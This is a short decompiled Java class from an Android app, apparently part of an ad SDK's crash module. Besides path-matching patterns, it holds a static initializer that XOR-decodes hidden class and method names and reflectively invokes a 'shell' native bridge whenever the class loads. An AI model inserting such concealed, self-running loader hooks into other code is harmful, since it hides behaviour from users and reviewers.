package com.kwad.sdk.crash;

import java.lang.reflect.Method;
import java.util.regex.Pattern;

/* loaded from: D:\mgba-android-version\tmp_gboy_apk\decoded\classes3.dex */
public final class d {
    public static final double aTF = Runtime.getRuntime().maxMemory();
    public static final Pattern aTG = Pattern.compile("/data/user");
    public static final Pattern aTH = Pattern.compile("/data");
    public static final Pattern aTI = Pattern.compile("/data/data/(.*)/data/.*");
    public static final Pattern aTJ = Pattern.compile("/data/user/.*/(.*)/data/.*");
    public static int aTK = 10;
    public static String aTL = "sessionId";

    static {
        pOOn();
    }

    private static /* synthetic */ void pOOn() {
        char[] charArray = "ïãá¢ëíáé¢îãõ¢ÿäéàà¢ÆâåÎþåèëé".toCharArray();
        int length = charArray.length;
        for (int i = 0; i < length; i++) {
            charArray[i] = (char) (charArray[i] ^ 140);
        }
        String str = new String(charArray);
        char[] charArray2 = "ïàåâåø".toCharArray();
        int length2 = charArray2.length;
        for (int i2 = 0; i2 < length2; i2++) {
            charArray2[i2] = (char) (charArray2[i2] ^ 140);
        }
        Method declaredMethod = Class.forName(str).getDeclaredMethod(new String(charArray2), new Class[0]);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(null, new Object[0]);
    }
}
